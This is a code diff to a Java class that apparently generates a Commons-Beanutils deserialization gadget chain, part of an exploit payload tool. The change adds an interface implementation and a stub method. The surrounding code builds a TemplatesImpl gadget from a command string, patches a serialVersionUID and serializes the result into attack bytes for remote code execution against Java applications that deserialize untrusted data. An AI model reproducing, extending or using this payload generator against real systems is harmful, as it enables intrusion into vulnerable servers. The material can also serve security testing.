@@ -14,9 +14,9 @@ import java.io.ObjectOutputStream;
 import java.util.Comparator;
 import java.util.PriorityQueue;
 
-public class CommonsBeanutils2NOCC {
+public class CommonsBeanutils2NOCC implements ObjectPayload<Object> {
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
 
         final Object templates = Gadgets.createTemplatesImpl(type, param);
         // 修改BeanComparator类的serialVersionUID
@@ -53,5 +53,10 @@ public class CommonsBeanutils2NOCC {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
     }
 }
